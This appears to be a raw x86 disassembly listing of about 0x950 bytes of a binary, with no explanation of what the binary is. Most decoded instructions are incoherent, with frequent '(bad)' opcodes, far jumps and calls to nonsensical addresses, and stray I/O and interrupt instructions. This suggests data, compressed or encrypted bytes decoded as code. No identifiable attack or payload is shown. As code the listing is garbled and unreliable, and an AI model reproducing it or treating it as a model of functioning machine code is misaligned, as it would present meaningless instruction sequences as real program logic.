  4087bb:	add    dh,ch
  4087bd:	push   edi
  4087be:	pop    es
  4087bf:	test   DWORD PTR [eax],eax
  4087c1:	xchg   edi,eax
  4087c2:	or     BYTE PTR [eax],al
  4087c4:	jmp    0x897:0xa500fed2
  4087cb:	(bad)  
  4087cc:	push   0xb507f76c
  4087d1:	xchg   edi,eax
  4087d2:	bound  eax,QWORD PTR [eax]
  4087d4:	jg     0x408766
  4087d6:	bound  eax,QWORD PTR [eax]
  4087d8:	mov    WORD PTR [edi+0x1498d0c],ss
  4087de:	fisttp DWORD PTR [ecx+edx*1-0x7c00cfd7]
  4087e5:	lea    ecx,[ecx+0x75]
  4087e8:	je     0x40880c
  4087ea:	mov    esi,0x91bd64fb
  4087ef:	add    BYTE PTR [esi+eiz*4+0x4489744a],cl
  4087f6:	fwait
  4087f7:	add    DWORD PTR [ebp+edi*4-0x33b4c5e],ecx
  4087fe:	or     bh,bh
  408800:	shl    DWORD PTR [ecx+0x5122],0x0
	...
  408817:	add    ah,bh
  408819:	imul   ecx,DWORD PTR [eax+0x50],0x85868d07
  408820:	cmp    BYTE PTR [edx+0x48],ah
  408823:	(bad)  
  408824:	mov    esp,0xdc4122ef
  408829:	mov    DWORD PTR [eax-0x77],ecx
  40882c:	adc    DWORD PTR [ebp-0x6aec00d0],ecx
  408832:	nop
  408833:	lods   al,BYTE PTR ds:[esi]
  408834:	or     edx,DWORD PTR [edx-0x5e1b7a7a]
  40883a:	call   FWORD PTR ss:[ebp+edx*1+0x35]
  40883f:	pop    ecx
  408840:	dec    ebp
  408841:	mov    ebp,0xc9dcb547
  408846:	ss jmp ebx
  408849:	jg     0x40889f
  40884b:	dec    eax
  40884c:	dec    ebp
  40884d:	mov    ebp,0xda239222
  408852:	mov    DWORD PTR ss:[ecx],edx
  408855:	fnstcw WORD PTR [esi]
  408857:	inc    ebx
  408859:	inc    esi
  40885a:	or     al,0x68
  40885c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40885d:	or     ebp,0xffffffff
  408860:	mov    dl,0x1f
  408862:	cmp    al,0xf7
  408864:	stos   DWORD PTR es:[edi],eax
  408865:	xchg   ebx,eax
  408866:	scas   al,BYTE PTR es:[edi]
  408867:	aas    
  408868:	pop    ecx
  408869:	int3   
  40886a:	cmp    ch,al
  40886c:	fwait
  40886d:	mov    dl,0x14
  40886f:	outs   dx,DWORD PTR ds:[esi]
  408870:	xchg   ebx,eax
  408871:	stos   BYTE PTR es:[edi],al
  408872:	mov    DWORD PTR [bx+si-0x5e],edi
  408876:	lea    edi,[edi]
  408878:	not    BYTE PTR [ecx+ebx*1+0x35]
	...
  40888f:	add    ch,dl
  408891:	push   ebx
  408892:	loope  0x4088d2
  408894:	cmp    DWORD PTR [ebp-0x5594c083],esp
  40889a:	adc    ebx,DWORD PTR [esp+edx*8+0x53]
  40889e:	loope  0x4088cb
  4088a0:	ret    0x5df9
  4088a3:	aas    
  4088a4:	add    eax,0x4b374910
  4088a9:	stos   BYTE PTR es:[edi],al
  4088aa:	jnp    0x408835
  4088ac:	pusha  
  4088ad:	mov    ds:0x3cdc3f35,al
  4088b2:	loop   0x40888d
  4088b4:	int3   
  4088b5:	xchg   esp,eax
  4088b6:	es jns 0x4088d5
  4088b9:	mov    ds:0x60233f2d,al
  4088be:	dec    ecx
  4088bf:	int3   
  4088c0:	int3   
  4088c1:	xchg   esp,eax
  4088c2:	or     ebx,esi
  4088c4:	loop   0x40886f
  4088c6:	add    eax,0xe820cc0b
  4088cb:	add    BYTE PTR [ecx-0x37],0xfd
  4088cf:	ds sti 
  4088d1:	nop
  4088d2:	je     0x4088e7
  4088d4:	repz fs push esi
  4088d7:	mov    esp,ebp
  4088d9:	mov    eax,ds:0xbc3c3eed
  4088de:	loopne 0x40894f
  4088e0:	fld    TBYTE PTR [ecx-0x2b78e837]
  4088e6:	pop    esp
  4088e7:	push   es
  4088e8:	pop    esp
  4088e9:	mov    esp,0xa9c36ab4
  4088ee:	lods   eax,DWORD PTR ds:[esi]
  4088ef:	mov    BYTE PTR [ecx+eiz*4+0xb607],ch
	...
  408906:	add    BYTE PTR [eax],al
  408908:	jb     0x408989
  40890a:	or     cl,ch
  40890c:	(bad)  
  40890d:	adc    eax,0xa95a8db5
  408912:	imul   cl
  408914:	jecxz  0x40893d
  408916:	mov    edx,DWORD PTR [ebx+eiz*2-0x5f]
  40891a:	test   BYTE PTR [esi+0x6a7d208f],0xc
  408921:	mov    esp,0x94ba7efe
  408926:	jl     0x40892d
  408928:	es test eax,0xa1c76483
  40892e:	mul    BYTE PTR [esi+0x3f]
  408931:	stos   BYTE PTR es:[edi],al
  408932:	mov    esp,0xf6a9a245
  408937:	inc    ecx
  408938:	push   edi
  408939:	shl    dh,0x4e
  40893c:	xchg   esi,eax
  40893d:	aam    0x7b
  40893f:	popf   
  408940:	push   cs
  408941:	out    0xcf,eax
  408943:	ss jp  0x4088ef
  408946:	pop    es
  408947:	mov    ebp,0xe9083146
  40894c:	jp     0x408938
  40894e:	neg    BYTE PTR [edi+edx*4+0x5a5159bc]
  408955:	test   eax,0xa1635cf6
  40895a:	test   BYTE PTR [esi],0xca
  40895d:	pop    ds
  40895e:	add    BYTE PTR [ecx],dl
  408960:	imul   edi,esp,0xdfb9fef6
  408966:	(bad)  
  408968:	mov    cl,0xa9
  40896a:	div    BYTE PTR [eax+eax*1+0x0]
	...
  40897e:	add    BYTE PTR [eax],al
  408980:	xchg   edi,eax
  408981:	mov    esp,0xa9a1918f
  408986:	not    BYTE PTR [eax+edi*1-0x6e29095f]
  40898d:	fucomip st,st(3)
  40898f:	(bad)  
  408990:	mov    DWORD PTR [ecx-0x677fff0a],ebp
  408996:	loopne 0x4089f0
  408998:	sbb    eax,0x30fff767
  40899d:	jo     0x40899e
  40899f:	(bad)  
  4089a0:	cli    
  4089a1:	data16 jge 0x4089ac
  4089a4:	std    
  4089a5:	mov    esp,DWORD PTR [eax-0x42990501]
  4089ab:	in     al,0xf2
  4089ad:	imul   ax
  4089b0:	mov    ebp,0xafff73d
  4089b5:	and    ah,ah
  4089b7:	idiv   edx
  4089b9:	imul   esp,eax,0xf769ce4d
  4089bf:	jmp    DWORD PTR [eax-0x15000088]
  4089c5:	js     0x408a11
  4089c7:	stos   DWORD PTR es:[edi],eax
  4089c8:	mov    edx,0xb5b5f769
  4089cd:	popa   
  4089ce:	idiv   edi
  4089d0:	int    0xa1
  4089d2:	mov    eax,ds:0x4d69caff
  4089d7:	clc    
  4089d8:	(bad)  
  4089da:	hlt    
  4089db:	(bad)  
  4089dc:	jp     0x408a47
  4089de:	jge    0x4089dc
  4089e0:	int    0xc5
  4089e2:	popf   
	...
  4089f7:	add    BYTE PTR ds:0x2508ca5b,dh
  4089fd:	mov    edi,0x5ca6ec81
  408a02:	cld    
  408a03:	jmp    DWORD PTR [eax]
  408a05:	cwde   
  408a06:	loopne 0x4089f3
  408a08:	pusha  
  408a09:	nop
  408a0a:	or     BYTE PTR [ecx+0x75f76c30],cl
  408a10:	std    
  408a11:	jnp    0x408a3c
  408a13:	stos   DWORD PTR es:[edi],eax
  408a14:	cli    
  408a15:	push   0x68e94581
  408a1a:	jge    0x408a18
  408a1c:	mov    edx,0x8cfffede
  408a21:	dec    eax
  408a22:	sbb    al,ch
  408a24:	test   esi,edi
  408a26:	xor    edi,edi
  408a28:	xchg   edi,eax
  408a29:	std    
  408a2a:	mov    esi,0x3071053d
  408a2f:	push   0xffffff8c
  408a31:	xor    dh,cl
  408a33:	repz cmp al,0xf6
  408a36:	mov    ebp,0x509cb4fb
  408a3b:	call   FWORD PTR [ebx+0x65744aa2]
  408a41:	xchg   ebp,eax
  408a42:	or     al,0x10
  408a44:	jnp    0x408a9d
  408a46:	xor    al,0x75
  408a48:	xchg   esp,eax
  408a49:	add    eax,0x267ba78f
  408a4e:	xor    al,0x75
  408a50:	je     0x408a70
  408a52:	mov    esi,0x2a06b0b
  408a57:	call   0xff74a08c
	...
  408a70:	pop    ebx
  408a71:	sar    BYTE PTR [esi],0xff
  408a74:	fld    DWORD PTR [ecx+0x34]
  408a77:	jne    0x408a0d
  408a79:	push   ebp
  408a7a:	xchg   ebp,eax
  408a7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a7c:	inc    ebx
  408a7d:	dec    esi
  408a7e:	xor    al,0x75
  408a80:	cmp    BYTE PTR [ebp+0x64],al
  408a83:	stos   BYTE PTR es:[edi],al
  408a84:	xor    ebx,DWORD PTR [esi+0x42]
  408a87:	ret    0xbd94
  408a8a:	fisttp QWORD PTR [edx-0x17b0c5d0]
  408a90:	ret    0xbe86
  408a93:	or     esp,DWORD PTR [esp+eax*1]
  408a96:	dec    DWORD PTR fs:[ebx]
  408a99:	mov    dl,0x4a
  408a9b:	jne    0x408a26
  408a9d:	out    dx,eax
  408a9e:	inc    ecx
  408a9f:	ret    0xbd84
  408aa2:	test   DWORD PTR [ebp-0x4],eax
  408aa5:	or     al,0x34
  408aa7:	jne    0x408a41
  408aa9:	xchg   ebp,eax
  408aaa:	loopne 0x408a5b
  408aac:	jecxz  0x408a41
  408aae:	out    dx,al
  408aaf:	bswap  esp
  408ab1:	xchg   esi,eax
  408ab2:	ins    DWORD PTR es:[edi],dx
  408ab3:	sahf   
  408ab4:	mov    WORD PTR [ecx+eiz*8-0x3757bec6],ss
  408abb:	mov    dh,dh
  408abd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408abe:	int    0x8d
  408ac0:	push   ecx
  408ac1:	mov    eax,0xa6b7b1b5
  408ac6:	xor    ebp,DWORD PTR [eax]
  408ac8:	stos   DWORD PTR es:[edi],eax
  408ac9:	and    BYTE PTR [ecx-0x520627d4],bh
  408acf:	cmp    eax,DWORD PTR [edi]
  408ad1:	and    DWORD PTR [ebp+0x2f],eax
	...
  408ae7:	add    BYTE PTR [ebp+0x3c],al
  408aea:	fstp   st(5)
  408aec:	int3   
  408aed:	xchg   esp,eax
  408aee:	aas    
  408aef:	sub    al,0x60
  408af1:	jmp    eax
  408af3:	add    eax,DWORD PTR [edi+0x6705fbd4]
  408af9:	push   0x68f4346a
  408afe:	sbb    eax,ebp
  408b00:	arpl   WORD PTR [esi-0x6b736ef6],bp
  408b06:	loop   0x408b3b
  408b08:	add    eax,0xd6ac4920
  408b0d:	dec    edx
  408b0e:	mov    al,ds:0x8abcda03
  408b13:	xchg   edx,eax
  408b14:	mov    WORD PTR [edx+edi*8+0x4a92b943],ss
  408b1b:	pop    ds
  408b1c:	push   ss
  408b1d:	test   DWORD PTR [edi],ebp
  408b1f:	add    al,0x8c
  408b21:	inc    esp
  408b22:	mov    bl,0x3a
  408b24:	mov    eax,ds:0x8bb115bc
  408b29:	mov    esp,0xa60b3a17
  408b2e:	mov    edx,0x61850bdb
  408b33:	cli    
  408b34:	sti    
  408b35:	and    BYTE PTR [ebx],dh
  408b37:	lods   al,BYTE PTR ds:[esi]
  408b38:	mov    WORD PTR [eax+ecx*1+0x7ca56606],es
  408b3f:	loope  0x408af8
  408b41:	(bad)  [ebp+0x7ca596e6]
  408b47:	fst    QWORD PTR [esi+0xd6e41f]
	...
  408b5d:	add    BYTE PTR [eax],al
  408b5f:	add    ah,bh
  408b61:	(bad)  
  408b62:	loopne 0x408b12
  408b64:	sub    eax,0xfcc6f6a5
  408b69:	mov    ecx,0xa520b9df
  408b6e:	mul    BYTE PTR [esp+ecx*8-0x4b]
  408b72:	push   edi
  408b73:	rol    DWORD PTR [esi+0x6aa6f6e4],0x94
  408b7a:	push   esi
  408b7b:	mov    al,0x49
  408b7d:	pushf  
  408b7e:	or     BYTE PTR [ebx+ebx*1],bh
  408b81:	mov    eax,0x3abba58a
  408b86:	or     BYTE PTR [ebx],dl
  408b88:	popf   
  408b89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b8a:	jl     0x408b7d
  408b8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b8d:	mov    gs,WORD PTR [edi+0x4d1ba676]
  408b93:	ins    DWORD PTR es:[edi],dx
  408b94:	aaa    
  408b95:	lea    edx,[edx-0x58]
  408b98:	(bad)  
  408b99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b9a:	jl     0x408b8d
  408b9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b9d:	in     eax,dx
  408b9e:	repz push esi
  408ba0:	xchg   BYTE PTR [edx],bh
  408ba2:	or     cl,al
  408ba4:	jmp    0xe829d4f3
  408ba9:	push   esi
  408baa:	push   edx
  408bab:	test   al,0x8f
  408bad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bae:	cmp    al,0x11
  408bb0:	push   edi
  408bb1:	push   esp
  408bb2:	or     BYTE PTR [ecx-0x5a],al
  408bb5:	clc    
  408bb6:	mul    BYTE PTR [esi]
  408bb8:	mov    dl,ah
  408bba:	jnp    0x408bbf
  408bbc:	loopne 0x408c21
  408bbe:	push   edx
  408bbf:	test   al,0x8f
  408bc1:	inc    esp
  408bc2:	loopne 0x408c26
	...
  408bd8:	je     0x408b7f
  408bda:	test   BYTE PTR [eax],0x15
  408bdd:	shl    ebp,0x75
  408be0:	std    
  408be1:	js     0x408bce
  408be3:	(bad)  
  408be4:	loop   0x408c50
  408be6:	loopne 0x408b71
  408be8:	dec    esp
  408be9:	push   0xfffffff7
  408beb:	push   0xffffff8f
  408bed:	js     0x408bc1
  408bef:	lods   eax,DWORD PTR ds:[esi]
  408bf0:	mov    dl,0x6a
  408bf2:	add    eax,eax
  408bf4:	imul   eax,ebp,0xd17f256e
  408bfa:	test   BYTE PTR [edi-0x23],0xf1
  408bfe:	mov    ds:0x37f7f2ff,eax
  408c03:	pop    edx
  408c04:	je     0x408b96
  408c06:	pop    eax
  408c07:	call   0x37b98a
  408c0c:	push   ebp
  408c0d:	shl    ch,0x75
  408c10:	popf   
  408c11:	js     0x408bce
  408c13:	(bad)  
  408c14:	and    bl,BYTE PTR [esi-0x20]
  408c17:	pop    ecx
  408c18:	int3   
  408c19:	pop    ebp
  408c1a:	imul   DWORD PTR [edx+0x71]
  408c1d:	jo     0x408bc1
  408c1f:	lods   eax,DWORD PTR ds:[esi]
  408c20:	repnz pop ebp
  408c22:	add    eax,eax
  408c24:	imul   eax,ebx,0xd77f256e
  408c2a:	test   BYTE PTR [edi-0x43],0xa6
  408c2e:	mov    ds:0x37f0b2ff,eax
  408c33:	pop    edx
  408c34:	hlt    
  408c35:	xchg   edi,eax
  408c36:	pop    eax
  408c37:	call   0x37c7ca
	...
  408c50:	adc    eax,0x3d75f5c8
  408c55:	jo     0x408be2
  408c57:	(bad)  
  408c58:	bound  ebx,QWORD PTR [ebp-0x20]
  408c5b:	sub    DWORD PTR [esi+ebx*2],ecx
  408c5e:	imul   DWORD PTR [edx+0x46]
  408c61:	jo     0x408cd5
  408c63:	lods   eax,DWORD PTR ds:[esi]
  408c64:	jb     0x408cc3
  408c66:	add    eax,eax
  408c68:	mov    WORD PTR [ecx],es
  408c6a:	(bad)  
  408c6b:	addr16 test eax,0x4bffc9e7
  408c71:	test   DWORD PTR [edx],ecx
  408c73:	lods   eax,DWORD PTR ds:[esi]
  408c74:	repz mov ds:0xec4630a2,al
  408c7a:	or     dl,BYTE PTR [eax-0xc]
  408c7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c7e:	outs   dx,BYTE PTR ds:[esi]
  408c7f:	(bad)  
  408c80:	fistp  DWORD PTR [ebp-0x24]
  408c83:	(bad)  
  408c84:	pop    ecx
  408c85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c86:	and    dl,BYTE PTR [ebx-0x36]
  408c89:	retf   0xe82f
  408c8c:	lds    edx,FWORD PTR ds:0x60bbff30
  408c92:	xor    bh,bh
  408c94:	cmp    DWORD PTR [ebp-0x150d93de],esp
  408c9a:	das    
  408c9b:	leave  
  408c9c:	into   
  408c9d:	mov    ecx,0xa07550a
  408ca2:	mov    al,ah
  408ca4:	mov    al,0xa
  408ca6:	xor    bh,bh
  408ca8:	sbb    DWORD PTR [eax+0x30],esi
  408cab:	push   eax
  408cac:	or     DWORD PTR [eax-0x55fe00e4],0x22
  408cb3:	add    al,0x0
	...
  408cc5:	add    BYTE PTR [eax],al
  408cc7:	add    BYTE PTR [ecx],bl
  408cc9:	lods   eax,DWORD PTR ds:[esi]
  408cca:	or     cl,BYTE PTR [ebx]
  408ccc:	dec    esp
  408ccd:	mov    edx,0xad8dbe75
  408cd2:	or     al,bh
  408cd4:	shl    DWORD PTR ds:0xad8c000b,1
  408cda:	inc    edi
  408cdb:	inc    ebp
  408cdc:	inc    eax
  408cdd:	dec    edx
  408cde:	or     BYTE PTR [eax],al
  408ce0:	mov    edi,ss
  408ce2:	or     ch,BYTE PTR [edx-0x74]
  408ce5:	(bad)  
  408ce6:	or     ch,BYTE PTR [edx-0x74]
  408ce9:	xor    BYTE PTR [esi+0x7638bcf3],dh
  408cef:	hlt    
  408cf0:	sbb    esi,DWORD PTR [edx+0x30]
  408cf3:	push   eax
  408cf4:	sbb    edx,DWORD PTR [esp+edx*4+0x1529133b]
  408cfb:	sub    esp,edx
  408cfd:	pop    es
  408cfe:	loope  0x408d03
  408d00:	xchg   edi,eax
  408d01:	aam    0x9c
  408d03:	(bad)  
  408d04:	in     al,0x14
  408d06:	loopne 0x408d0b
  408d08:	mov    WORD PTR [edi*1-0x16bb335],gs
  408d0f:	lods   eax,DWORD PTR ds:[esi]
  408d10:	xchg   ebx,eax
  408d11:	lods   al,BYTE PTR ds:[esi]
  408d12:	int    0x67
  408d14:	(bad)  [edx+0x10bc8b30]
  408d1a:	ins    BYTE PTR es:[edi],dx
  408d1b:	xor    bl,al
  408d1d:	mov    ds:0xac5dd4dd,al
  408d22:	std    
  408d23:	addr16 mov ebx,0xbc8177a2
  408d29:	stos   BYTE PTR es:[edi],al
  408d2a:	mov    ch,0x37
	...
  408d40:	mov    ah,0x30
  408d42:	mov    DWORD PTR [edi],esi
  408d44:	mov    ds:0xdabe12d,eax
  408d49:	and    BYTE PTR ds:[ebx+edx*4],al
  408d4d:	call   0xa2cbbce2
  408d52:	popf   
  408d53:	mov    cl,0x97
  408d55:	lods   al,BYTE PTR ds:[esi]
  408d56:	adc    BYTE PTR [ebx+0x7b],ch
  408d59:	mov    ds:0xaa688177,al
  408d5e:	jne    0x408d97
  408d60:	not    BYTE PTR [ecx+ecx*1-0x1eac3975]
  408d67:	and    DWORD PTR ss:[ebp-0x5dacc8ab],esp
  408d6e:	fild   DWORD PTR [edi]
  408d70:	xor    al,0x48
  408d72:	mov    dh,BYTE PTR [edi]
  408d74:	inc    ebx
  408d75:	or     al,0x6c
  408d77:	and    al,0x43
  408d79:	mov    ds:0x3a33aa4d,al
  408d7e:	mov    bl,0xd9
  408d80:	int3   
  408d81:	xchg   esp,eax
  408d82:	or     BYTE PTR [esi],dh
  408d84:	popf   
  408d85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d86:	(bad)  
  408d87:	arpl   WORD PTR cs:[ecx+0x5e67f57c],sp
  408d8e:	mov    ds:0x8d0bc31e,eax
  408d93:	add    eax,0x83f6a1b3
  408d98:	(bad)  
  408d99:	sub    al,0x71
  408d9b:	mov    ds:0x34f5a1c8,eax
  408da0:	mov    al,ds:0xf6f6a9
	...
  408db5:	add    BYTE PTR [eax],al
  408db7:	add    BYTE PTR [edx-0x7cfefbd9],bl
  408dbd:	in     eax,dx
  408dbe:	mul    dh
  408dc0:	add    BYTE PTR [eax],bl
  408dc2:	loopne 0x408d9a
  408dc4:	and    BYTE PTR [ecx+0x8f7e961],0x52
  408dcb:	sub    BYTE PTR [eax+0x62b9bca1],dl
  408dd1:	mov    eax,ds:0x8ddcbef6
  408dd6:	loopne 0x408dc5
  408dd8:	mov    eax,ss:0xc10c60f6
  408dde:	(bad)  
  408ddf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408de0:	pop    edx
  408de1:	adc    eax,0xa1ba85b5
  408de6:	imul   cl
  408de8:	cmp    al,0x8c
  408dea:	mov    ecx,DWORD PTR [edi+ebp*4-0x57]
  408dee:	test   BYTE PTR [esi+0x6a6d288f],0xe4
  408df5:	mov    al,0xfe
  408df7:	jbe    0x408d93
  408df9:	xchg   esp,eax
  408dfa:	jl     0x408e09
  408dfc:	pandn  mm3,mm7
  408dff:	pop    esi
  408e00:	call   0x839:0x5ed507a1
  408e07:	jmp    0xd5377076
  408e0c:	xchg   DWORD PTR [ebp+ebp*2-0x895ff00],ebp
  408e13:	jmp    DWORD PTR [eax+0x5affff79]
  408e19:	push   0x7d
  408e1b:	or     BYTE PTR [eax],al
	...
  408e2d:	add    BYTE PTR [eax],al
  408e2f:	add    ch,cl
  408e31:	sbb    ebp,DWORD PTR [edi+edi*8-0x17429596]
  408e38:	mov    ds:0x20fff76a,al
  408e3d:	(bad)  
  408e3e:	loopne 0x408dec
  408e40:	push   ecx
  408e41:	push   0xfffffff7
  408e43:	push   DWORD PTR [eax-0x1500007f]
  408e49:	data16 jge 0x408e54
  408e4c:	lea    eax,[edi]
  408e4e:	lods   al,BYTE PTR ds:[esi]
  408e4f:	(bad)  
  408e50:	jmp    0xf766:0xb2e0bd66
  408e57:	jmp    DWORD PTR [eax-0x70]
  408e5a:	loopne 0x408dec
  408e5c:	adc    DWORD PTR [edi-0x9],esp
  408e5f:	jmp    DWORD PTR [eax]
  408e61:	cmp    al,0xff
  408e63:	dec    edx
  408e65:	data16 jge 0x408e70
  408e68:	mov    ebp,0xdaffac15
  408e6d:	mov    bp,0xe2e4
  408e71:	imul   ax
  408e74:	cmp    DWORD PTR [edi],0x302afff7
  408e7a:	call   0xe0aaa976
  408e7f:	pop    ecx
  408e80:	shr    BYTE PTR [ecx-0x9],cl
  408e83:	push   DWORD PTR [eax-0x15000094]
  408e89:	jo     0x408ed1
  408e8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e8c:	fisubr DWORD PTR [ecx-0x9]
  408e8f:	mov    ch,0xd
  408e91:	jb     0x408e8a
  408e93:	inc    DWORD PTR [eax]
	...
  408ea5:	add    BYTE PTR [eax],al
  408ea7:	add    BYTE PTR [ebp-0x1500522b],bh
  408ead:	imul   edi,DWORD PTR [ebp+0x3d3e8cdc],0x558624ff
  408eb7:	push   DWORD PTR [ebx]
  408eb9:	push   edi
  408eba:	lock and ebx,DWORD PTR [bx+0x3d]
  408ebf:	call   FWORD PTR [ecx-0x7b8ac447]
  408ec5:	push   ebp
  408ec6:	(bad)  
  408ec7:	std    
  408ec8:	adc    esi,DWORD PTR [edi+0x3d]
  408ecb:	mov    ch,0xfc
  408ecd:	xchg   BYTE PTR ds:0x53a9f4ff,bh
  408ed3:	(bad)  
  408ed4:	sti    
  408ed5:	mov    ?,WORD PTR [edi+0x3cfce5f7]
  408edb:	(bad)  
  408edc:	jmp    0x408e7c
  408ede:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408edf:	sti    
  408ee0:	hlt    
  408ee1:	in     eax,0x97
  408ee3:	add    BYTE PTR [esp+esi*2+0x608c0c4a],cl
  408eea:	sub    esp,0x6a3efa0f
  408ef0:	mov    WORD PTR [ebx+0x6],ss
  408ef3:	inc    DWORD PTR [ecx-0x4b]
  408ef6:	and    ch,BYTE PTR [esi]
  408ef8:	call   0x51c9cad3
  408efd:	loope  0x408ea1
  408eff:	sahf   
  408f00:	inc    esi
  408f01:	ins    BYTE PTR es:[edi],dx
  408f02:	or     al,0x68
  408f04:	mov    gs,WORD PTR [ebp-0x7f6c7ff6]
  408f0a:	add    al,0xe8
	...
  408f20:	add    DWORD PTR [eax],0x3c
  408f23:	push   esp
  408f25:	rol    DWORD PTR es:[eax-0x74],1
  408f29:	push   cs
  408f2a:	out    0xd7,al
  408f2c:	les    ebp,FWORD PTR [esp+ecx*1-0x1]
  408f30:	loope  0x408ed7
  408f32:	and    ah,ah
  408f34:	popa   
  408f35:	es cmp al,0xff
  408f38:	loope  0x408f6b
  408f3a:	cmp    al,0x75
  408f3c:	test   BYTE PTR [ecx+ebx*2+0x559eefc2],dl
  408f43:	dec    edx
  408f44:	dec    esi
  408f45:	cwde   
  408f46:	loope  0x408f16
  408f48:	push   es
  408f49:	mov    al,0x5f
  408f4b:	aas    
  408f4c:	push   eax
  408f4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f4e:	dec    ebp
  408f4f:	xor    al,0x19
  408f51:	pop    ecx
  408f52:	xor    eax,0xd12922d3
  408f57:	xor    al,0xa1
  408f59:	nop
  408f5a:	dec    ecx
  408f5b:	pop    edx
  408f5c:	(bad)  
  408f5d:	xchg   ebx,eax
  408f5e:	loope  0x408f68
  408f60:	int3   
  408f61:	mov    gs,WORD PTR [ebp+esi*2-0x73]
  408f65:	xchg   esp,eax
  408f66:	loope  0x408fa4
  408f68:	push   ecx
  408f69:	pushf  
  408f6a:	loopne 0x408f6f
  408f6c:	mov    WORD PTR [esi+eiz*1-0x12612042],ss
  408f73:	add    ecx,DWORD PTR [edx+ebp*1+0x2cdba9e1]
  408f7a:	loope  0x408f25
  408f7c:	ror    DWORD PTR [edi],cl
  408f7e:	and    al,0x38
  408f80:	pop    esp
  408f81:	adc    DWORD PTR [eax+edi*1+0x0],ebp
	...
  408f95:	add    BYTE PTR [eax],al
  408f97:	add    BYTE PTR [ebx-0x452b2262],bh
  408f9d:	sub    cl,bl
  408f9f:	xor    edi,DWORD PTR [ecx]
  408fa1:	mov    al,ds:0x93fe5fd8
  408fa6:	loope  0x408fa6
  408fa8:	jecxz  0x408fd1
  408faa:	in     al,0x1c
  408fac:	or     eax,0x2403e195
  408fb1:	call   0x9fcc54ee
  408fb6:	sbb    edx,DWORD PTR [esp+esi*2]
  408fb9:	mov    eax,ds:0x457b3347
  408fbe:	push   0x54
  408fc0:	add    DWORD PTR [eax],ebx
  408fc2:	jne    0x408fff
  408fc4:	imul   ebx,DWORD PTR [esi-0x4e9429f0],0x7
  408fcb:	inc    eax
  408fcc:	lahf   
  408fcd:	popf   
  408fce:	and    BYTE PTR [eax+ebx*4-0x5b],0xf6
  408fd3:	data16 test al,0x52
  408fd6:	scas   al,BYTE PTR es:[edi]
  408fd7:	pop    esi
  408fd8:	jg     0x409004
  408fda:	or     cl,al
  408fdc:	jno    0x409018
  408fde:	dec    ecx
  408fdf:	jmp    0x3f387762
  408fe4:	pop    edi
  408fe5:	popf   
  408fe6:	div    BYTE PTR [ebx+eiz*1+0x5f804cb6]
  408fed:	popf   
  408fee:	and    BYTE PTR [esp+eiz*2-0x5b],0xf6
  408ff3:	sub    bl,BYTE PTR es:[esi+0x54d20f6e]
  408ffa:	or     BYTE PTR [esi],dl
	...
  409010:	jne    0x408fb6
  409012:	dec    BYTE PTR [esi]
  409014:	mov    edi,0x87f57c9d
  409019:	push   0xffffffa1
  40901b:	(bad)  
  40901c:	sahf   
  40901d:	or     ecx,DWORD PTR [ebp-0x96268f7]
  409023:	or     DWORD PTR [edi-0x2ebc3bd4],0xffffff9d
  40902a:	cmc    
  40902b:	xchg   esp,eax
  40902c:	jg     0x408fd3
  40902e:	not    dh
  409030:	jle    0x409059
  409032:	add    al,0xc1
  409034:	mov    gs,ebx
  409036:	test   dh,0x28
  409039:	pop    ss
  40903a:	in     al,0xb6
  40903c:	pop    esi
  40903d:	popf   
  40903e:	popa   
  40903f:	jmp    0x2892583b
  409044:	mov    BYTE PTR [ebp-0x62396644],bl
  40904a:	neg    BYTE PTR [esi-0x621f76bc]
  409050:	xlat   BYTE PTR ds:[ebx]
  409051:	popf   
  409052:	mul    BYTE PTR [eax+0x4]
  409055:	lods   al,BYTE PTR ds:[esi]
  409056:	inc    BYTE PTR [eax]
  409058:	adc    ah,BYTE PTR [edx+0x62]
  40905b:	add    BYTE PTR [ebp+0x6d],bh
  40905e:	push   edx
  40905f:	inc    ecx
  409060:	bound  edi,QWORD PTR gs:[ebp-0x89d2510]
  409067:	jmp    FWORD PTR [eax-0x63]
  40906a:	out    dx,al
  40906b:	fstp   DWORD PTR ds:0xa889f762
  409071:	dec    ebp
  409072:	(bad)  
  409073:	inc    DWORD PTR [eax]
	...
  409085:	add    BYTE PTR [eax],al
  409087:	add    dl,al
  409089:	push   ss
  40908a:	mov    ch,0xe4
  40908c:	push   0x62
  40908e:	test   DWORD PTR [eax],0xbd899fd8
  409094:	lds    ebx,FWORD PTR [edx-0x9]
  409097:	jmp    DWORD PTR ds:0x70836be5
  40909d:	jge    0x40909e
  40909f:	jmp    DWORD PTR [edx+0x665c7c91]
  4090a5:	and    al,0xe0
  4090a7:	test   DWORD PTR [edx+0x6740862],0x92fff6f9
  4090b1:	and    esi,edi
  4090b3:	jne    0x4090a2
  4090b5:	js     0x4090ea
  4090b7:	mov    ds:0xb5f762e2,al
  4090bc:	loope  0x409118
  4090be:	idiv   edi
  4090c0:	loop   0x4090a6
  4090c2:	push   cs
  4090c3:	call   0x37c6fa
  4090c8:	ret    0xe024
  4090cb:	not    edx
  4090cd:	(bad)  
  4090ce:	div    DWORD PTR [ebp-0x63]
  4090d1:	js     0x40905c
  4090d3:	mov    ds:0xb5f762e2,al
  4090d8:	leave  
  4090d9:	pop    edx
  4090da:	idiv   edi
  4090dc:	xor    ah,ah
  4090de:	push   cs
  4090df:	call   0x37c38a
  4090e4:	mov    WORD PTR [edx],es
  4090e6:	jg     0x4090c8
  4090e8:	jnp    0x4090f5
  4090ea:	cmp    edi,edi
	...
  409100:	loope  0x4090a7
  409102:	adc    ah,BYTE PTR [ebp+0x2e]
  409105:	sbb    edi,DWORD PTR [ecx]
  409107:	jmp    DWORD PTR [ecx]
